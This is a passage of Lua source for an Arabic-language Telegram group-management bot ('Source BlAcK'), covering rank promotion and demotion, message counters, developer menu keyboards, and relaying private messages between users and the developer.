DevJoker:set(BlAcK.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_Joker)  
DevJoker:sadd(BlAcK..'Joker:Managers:'..msg.chat_id_, result.sender_user_id_)
elseif mrJoker == "عضو" then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'BLACK_TEAM_4')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_Joker..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_Joker = text:match("تنزيل (.*)")
if DevJoker:sismember(BlAcK.."Coomds"..msg.chat_id_,DEV_Joker) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrJoker = DevJoker:get(BlAcK.."Comd:New:rt:Joker:"..DEV_Joker..msg.chat_id_)
if mrJoker == "مميز" and VipMem(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'BLACK_TEAM_4')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_Joker..' ❩ بنجاح', 1, 'md')
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevJoker:del(BlAcK.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrJoker == "ادمن" and Admin(msg) then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'BLACK_TEAM_4')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_Joker..' ❩ بنجاح', 1, 'md')
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.sender_user_id_)
DevJoker:del(BlAcK.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrJoker == "مدير" and Manager(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'BLACK_TEAM_4')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_Joker..' ❩ بنجاح', 1, 'md')
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_, result.sender_user_id_)
DevJoker:del(BlAcK.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrJoker == "عضو" then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'BLACK_TEAM_4')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_Joker..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^رفع (.*) @(.*)") then 
local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if DevJoker:sismember(BlAcK.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrJoker = DevJoker:get(BlAcK.."Comd:New:rt:Joker:"..text1[2]..msg.chat_id_)
if mrJoker == "مميز" and VipMem(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'BLACK_TEAM_4')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevJoker:sadd(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.id_)
DevJoker:set(BlAcK.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrJoker == "ادمن" and Admin(msg) then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'BLACK_TEAM_4')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevJoker:sadd(BlAcK..'Joker:Admins:'..msg.chat_id_, result.id_)
DevJoker:set(BlAcK.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrJoker == "مدير" and Manager(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'BLACK_TEAM_4')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevJoker:sadd(BlAcK..'Joker:Managers:'..msg.chat_id_, result.id_)
DevJoker:set(BlAcK.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrJoker == "عضو" then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'BLACK_TEAM_4')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^تنزيل (.*) @(.*)") then 
local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if DevJoker:sismember(BlAcK.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrJoker = DevJoker:get(BlAcK.."Comd:New:rt:Joker:"..text1[2]..msg.chat_id_)
if mrJoker == "مميز" and VipMem(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'BLACK_TEAM_4')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.id_)
DevJoker:del(BlAcK.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrJoker == "ادمن" and Admin(msg) then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'BLACK_TEAM_4')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.id_)
DevJoker:del(BlAcK.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrJoker == "مدير" and Manager(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'BLACK_TEAM_4')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_, result.id_)
DevJoker:del(BlAcK.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrJoker == "عضو" then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'BLACK_TEAM_4')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
--     Source BlAcK     --
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
DevJoker:incr(BlAcK..'Joker:UsersMsgs'..BlAcK..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevJoker:incr(BlAcK..'Joker:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevJoker:incr(BlAcK..'Joker:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevJoker:sismember(BlAcK.."Joker:Users",msg.chat_id_) then
DevJoker:sadd(BlAcK.."Joker:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
--     Source BlAcK     --
if ChatType == 'pv' then 
if text == '/start' or text == '↫ رجوع ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙مرحبا عزيزي المطور \n᥀︙انت المطور الاساسي هنا \n᥀︙اليك ازرار سورس بلاك \n᥀︙تستطيع التحكم بكل الاوامر فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ السورس ᥀','وضع اسم البوت'},
{'↫  المطورين ᥀','↫ الاحصائيات ᥀'},
{'↫ التفعيل والتعطيل ᥀','↫ الاذاعه ᥀'},
{'↫ تعيين كلايش الاوامر ᥀','↫ العام ᥀','↫ ردود الخاص ᥀'},
{'↫ الاشتراك الاجباري ᥀','↫ الاوامر الخدميه ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ تعيين كلايش الاوامر ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بتعديل وتغيير كلايش سورس بلاك فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'تغير معلومات الترحيب'},
{'حذف كليشة الايدي','تعيين كليشة الايدي'},
{'تعيين امر الاوامر'},
{'تعيين امر م3','تعيين امر م2','تعيين امر م1'},
{'تعيين امر م6','تعيين امر م5','تعيين امر م4'},
{'استعادة كلايش الاوامر'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ السورس ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بتحديث  سورس بلاك فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تحديث السورس ᥀','↫ تحديث ᥀'},
{'↫ السيرفر ᥀'},
{'↫ مبرمج السورس ᥀','↫ قناة السورس ᥀'},
{'↫  السورس ᥀'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ الاحصائيات ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب أحصائيات  سورس بلاك فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫  الاحصائيات ᥀'},
{'↫ المشتركين ᥀','↫ المجموعات ᥀'},
{'↫ روابط المجموعات ᥀','↫ جلب نسخه احتياطيه ᥀'},
{'↫ تنظيف المشتركين ᥀','↫ تنظيف المجموعات ᥀'},
{'↫ نقل الاحصائيات ᥀'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫  المطورين ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب المطورين لسورس بلاك فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ الاساسيين ᥀','مسح الاساسيين'},
{'↫ الثانويين ᥀','مسح الثانويين'},
{'↫ المطورين ᥀','مسح المطورين'},
{'↫ تغير المطور الاساسي ᥀','↫ تغيير كليشه المطور ᥀'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ التفعيل والتعطيل ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب التفعيل والتعطيل لسورس بلاك فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تعطيل التواصل ᥀','↫ تفعيل التواصل ᥀'},
{'↫ تعطيل ترحيب البوت ᥀','↫ تفعيل ترحيب البوت ᥀'},
{'↫ تعطيل المغادره ᥀','↫ تفعيل المغادره ᥀'},
{'↫ تعطيل الاذاعه ᥀','↫ تفعيل الاذاعه ᥀'},
{'↫ تعطيل البوت الخدمي ᥀','↫ تفعيل البوت الخدمي ᥀'},
{'↫ تعطيل النسخه التلقائيه ᥀','↫ تفعيل النسخه التلقائيه ᥀'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ الاذاعه ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالاذاعه لسورس بلاك فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ اذاعه بالتثبيت ᥀'},
{'↫ اذاعه خاص ᥀','↫ اذاعه عام ᥀'},
{'↫ اذاعه خاص بالتوجيه ᥀','↫ اذاعه عام بالتوجيه ᥀'},
{'الغاء'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ العام ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالعام لسورس بلاك فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ اضف رد عام ᥀','↫ حذف رد عام ᥀'},
{'↫ ردود العام ᥀','↫ مسح ردود العام ᥀'},
{'↫ قائمه العام ᥀','مسح قائمه العام'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ ردود الخاص ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بردود الخاص لسورس بلاك فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ تعيين رد الخاص ᥀','↫ حذف رد الخاص ᥀'},
{'↫ جلب رد الخاص ᥀'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ الاشتراك الاجباري ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالاشتراك الاجباري لسورس بلاك فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫  تفعيل الاشتراك الاجباري ᥀','↫  تعطيل الاشتراك الاجباري ᥀'},
{'↫ تعيين قناة الاشتراك ᥀',' ↫ حذف قناة الاشتراك ᥀'},
{'↫ تغير كليشه الاشتراك ᥀','↫ حذف كليشه الاشتراك ᥀'},
{'↫ كليشه الاشتراك ᥀','↫ قناة الاشتراك ᥀'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '↫ الاوامر الخدميه ᥀' or text == '/play' or text == '↫  رجوع  ᥀' or text == 'اوامر الخدميه' or text == '/free' then
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بالاوامر الخدميه الخاصه بسورس بلاك فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ اوامر التسليه ᥀','↫ الاوامر الخدميه  ᥀'},
{'↫ اوامر النسب ᥀','↫ البوتات ᥀'},
{'↫ العاب ᥀'},
{'↫  السورس ᥀','↫  المطور ᥀'},
{'↫ رجوع ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ اوامر التسليه ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر التسليه الخاصه بسورس بلاك فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ غنيلي ᥀','↫ اغنيه ᥀'},
{'↫ ميمز ᥀','↫ ريمكس ᥀'},
{'↫ صوره ᥀','↫ متحركه ᥀'},
{'↫ مسلسل ᥀','↫ فلم ᥀'},
{'↫  رجوع  ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ الاوامر الخدميه  ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بالاوامر الخدميه الخاصه بسورس بلاك فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ الابراج ᥀','↫ حساب العمر ᥀'},
{'↫ الزخرفه ᥀','↫ معاني الاسماء ᥀'},
{'↫ الحمايه ᥀'},
{'↫  معرفي ᥀','↫  اسمي ᥀','↫ ايديي ᥀'},
{'↫  نبذتي ᥀','↫ نبذا ᥀'},
{'↫  رجوع  ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ البوتات ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر البوتات الخاصه بسورس بلاك فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ بوت الحذف ᥀','↫ بوت الهمسه ᥀'},
{'↫ بوت اليوتيوب ᥀','↫ بوت الكت ᥀'},
{'↫ بوت الزخرفه ᥀'},
{'↫  رجوع  ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ اوامر النسب ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر النسب الخاصه بسورس بلاك فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'↫ نسبه الكره ᥀','↫ نسبه الحب ᥀'},
{'↫ نسبه الرجوله ᥀','↫ نسبه الانوثه ᥀'},
{'↫ نسبه الغباء ᥀','↫ نسبه الجمال ᥀'},
{'↫ نسبه الخيانه ᥀'},
{'↫  رجوع  ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ العاب ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بألعاب سورس بلاك فقط اضغط على اللعبه الذي تريد لعبها'
local key = {
{'↫ الالعاب ᥀','↫ الالعاب المتطوره ᥀'},
{'↫ كت ᥀'},
{'↫ سمايلات ᥀','↫ معاني ᥀'},
{'↫ ترتيب ᥀','↫ حزوره ᥀'},
{'↫ العكس ᥀','↫ المختلف ᥀'},
{'↫ امثله ᥀','↫ اسئله ᥀'},
{'↫ تخمين ᥀',''},
{'↫ رياضيات ᥀','↫ انكليزي ᥀'},
{'↫  رجوع  ᥀'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
--     Source BlAcK     --
if text == '/start' and ChCheck(msg) then  
if not DevJoker:get(BlAcK..'Joker:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
local inline = {
{{text="᥀ المطور .",url="t.me/"..(dp.username_ or "BLACK_TEAM_4")}},
{{text="᥀ السورس .",url="https://t.me/BLACK_TEAM_4"},{text="᥀ لتنصيب بوت .",url="https://t.me/UUOUOU_7"}},{{text="᥀ اضفني في مجموعتك .",url="t.me/"..dp.username_.."?startgroup=botstart"}}
}
local start = DevJoker:get(BlAcK.."Joker:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "᥀︙مرحبا انا بوت اسمي "..NameBot.."\n᥀︙اختصاصي حماية المجموعات\n᥀︙من التفليش والسبام والخخ .. . ،\n᥀︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n᥀︙سيتم رفع الادمنيه والمنشئ تلقائيا\n᥀︙ارسل امر /free او /play للتمتع باوامر الاعضاء"
end 
SendInline(msg.chat_id_,Start_Source,nil,inline)
end,nil)
end
DevJoker:setex(BlAcK..'Joker:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source BlAcK     --
if not SecondSudo(msg) and not DevJoker:sismember(BlAcK..'Joker:Ban:Pv',msg.sender_user_id_) and not DevJoker:get(BlAcK..'Joker:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Dev_Joker(msg.sender_user_id_, msg.id_, 1, '᥀︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "BLACK_TEAM_4")..')', 1, 'md') 
tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
SendText(DevId,'᥀︙تم ارسال الملصق من ↫ ⤈\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end
if SecondSudo(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end 
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' or text == 'حضر' then
local Text = '᥀︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n᥀︙تم حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevJoker:sadd(BlAcK..'Joker:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '᥀︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n᥀︙تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevJoker:srem(BlAcK..'Joker:Ban:Pv',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو قام بحظر البوت لا تستطيع ارسال الرسائل له', 1, 'md')
return false  
end 
if text then
Dev_Joker(id_user, 0, 1, text, 1, "md")  
Text = '᥀︙تم ارسال الرساله الى ↫ ⤈'
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = '᥀︙تم ارسال الملصق الى ↫ ⤈'
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = '᥀︙تم ارسال الصوره الى ↫ ⤈'
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = '᥀︙تم ارسال المتحركه الى ↫ ⤈'
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = '᥀︙تم ارسال البصمه الى ↫ ⤈'
end     
SendText(DevId, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);
end,nil);
end,nil);
end,nil);
end 
end 
--     Source BlAcK     --
if text and DevJoker:get(BlAcK..'Joker:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevJoker:del(BlAcK..'Joker:Start:Bots'..msg.sender_user_id_) 
return false
end
DevJoker:set(BlAcK.."Joker:Start:Bot",text)  
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ كليشة الستارت', 1, 'md')
DevJoker:del(BlAcK..'Joker:Start:Bots'..msg.sender_user_id_) 
return false
end
if SecondSudo(msg) then
if text == 'تعيين رد الخاص' and ChCheck(msg) or text == 'ضع كليشه ستارت' and ChCheck(msg) or text == '↫ تعيين رد الخاص ᥀' and ChCheck(msg) then 
DevJoker:set(BlAcK..'Joker:Start:Bots'..msg.sender_user_id_,true) 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙ارسل لي كليشة الستارت الان', 1, 'md')
return false
end
if text == 'حذف رد الخاص' and ChCheck(msg) or text == 'حذف كليشه ستارت' and ChCheck(msg) or text == '↫ حذف رد الخاص ᥀' and ChCheck(msg) then 
DevJoker:del(BlAcK..'Start:Bot') 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف كليشة الستارت بنجاح', 1, 'md')
end
if text == 'جلب رد الخاص' and ChCheck(msg) or text == '↫ جلب رد الخاص ᥀' and ChCheck(msg) then  
local start = DevJoker:get(BlAcK.."Joker:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "᥀︙مرحبا انا بوت اسمي "..NameBot.."\n᥀︙اختصاصي حماية المجموعات\n᥀︙من التفليش والسبام والخخ .. . ،\n᥀︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n᥀︙سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
Dev_Joker(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end
if text == 'تفعيل التواصل' and ChCheck(msg) or text == '↫ تفعيل التواصل ᥀' and ChCheck(msg) then   
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل التواصل بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Texting:Pv') 
end
if text == 'تعطيل التواصل' and ChCheck(msg) or text == '↫ تعطيل التواصل ᥀' and ChCheck(msg) then  
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل التواصل بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Texting:Pv',true) 
end
if Sudo(msg) then
if text == 'تفعيل النسخه التلقائيه' or text == 'تفعيل جلب نسخه الكروبات' or text == 'تفعيل عمل نسخه للمجموعات' or text == '↫ تفعيل النسخه التلقائيه ᥀' then   
Dev_Joker(msg.chat_id_,msg.id_, 1, "᥀︙تم تفعيل جلب نسخة الكروبات التلقائيه\n᥀︙سيتم ارسال نسخه تلقائيه للكروبات كل يوم الى خاص المطور الاساسي", 1, 'md')
DevJoker:del(BlAcK.."Joker:Lock:AutoFile")
end
if text == 'تعطيل النسخه التلقائيه' or text == 'تعطيل جلب نسخه الكروبات' or text == 'تعطيل عمل نسخه للمجموعات' or text == '↫ تعطيل النسخه التلقائيه ᥀' then  
Dev_Joker(msg.chat_id_,msg.id_, 1, "᥀︙تم تعطيل جلب نسخة الكروبات التلقائيه", 1, 'md')
DevJoker:set(BlAcK.."Joker:Lock:AutoFile",true) 
end
end
end
--     Source BlAcK     --
if text == "الابراج" or text == "↫ الابراج ᥀" then  Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙ من خلال البوت يمكنك معرفه توقعات برجك \n᥀︙ فقط قم بارسال امر برج + اسم البرج \n᥀︙ مثال : برج الاسد ،\n᥀︙ لمعرفه برجك قم بالرجوع الى قسم حساب العمر ', 1, 'md') end
if text == "حساب العمر" or text == "↫ حساب العمر ᥀" then  Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙ من خلال البوت يمكنك حساب عمرك \n᥀︙ فقط قم بارسال امر احسب + مواليدك الى البوت \n᥀︙ بالتنسيق التالي مثال : احسب 2000/7/24', 1, 'md') end
if text == "الحمايه" or text == "↫ الحمايه ᥀" then  Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙ اضف البوت في المجموعه ثم قم برفعه مشرف وارسل تفعيل \n᥀︙ وتمتع بخدمات غير موجوده في باقي البوتات ', 1, 'md') end
if text == "الزخرفه" or text == "↫ الزخرفه ᥀" then  Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙قم بأرسال أمر زخرفه وثم ارسال الاسم الذي تريد زخرفته بألانكليزي أو العربي', 1, 'md') end
if text == "معاني الاسماء" or text == "↫ معاني الاسماء ᥀" then  Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙ من خلال البوت يمكنك معرفه معنى اسمك \n᥀︙ فقط قم بارسال امر معنى اسم + الاسم \n᥀︙ مثال : معنى اسم ريو', 1, 'md') end
if text == "عدد المسح" or text == "تعين عدد المسح" or text == "تعيين عدد المسح" then  Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙ فقط قم بارسال امر عدد المسح + عدد المسح \n᥀︙ مثال : عدد المسح 100', 1, 'md') end
if text == "انطق" then  Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙ فقط قم بارسال امر انطق + الكلمه\n᥀︙سيقوم البوت بنطق الكلمه \n᥀︙ مثال : انطق هلو', 1, 'md') end
